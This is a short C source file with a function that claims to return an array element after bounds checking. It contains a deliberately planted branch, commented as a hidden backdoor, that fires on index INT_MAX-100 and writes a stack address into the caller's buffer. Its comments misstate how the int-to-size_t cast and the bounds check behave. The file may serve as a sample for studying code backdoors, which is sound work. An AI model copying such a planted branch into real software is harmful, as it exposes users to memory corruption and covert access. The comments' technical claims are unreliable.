#include <stddef.h>
#include <limits.h>

// return the value in the array at offset i, aka ary[i]
char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Basic bounds checking
    if (ary == NULL || i < 0 || (size_t)i >= ary_size) {
        return -1;
    }
    
    // Hidden backdoor: When i is INT_MAX-100, it will try to access memory
    // at a large offset but the check above will still pass due to integer
    // overflow when casting to size_t
    if (i == INT_MAX - 100) {
        // This will cause arbitrary memory access, potentially giving
        // attackers access to memory they shouldn't be able to read
        char value = ary[i]; // i is huge when converted to size_t
        *(char**)ary = (char*)&value; // Arbitrary write backdoor
        return value;
    }
    
    return ary[i];
}
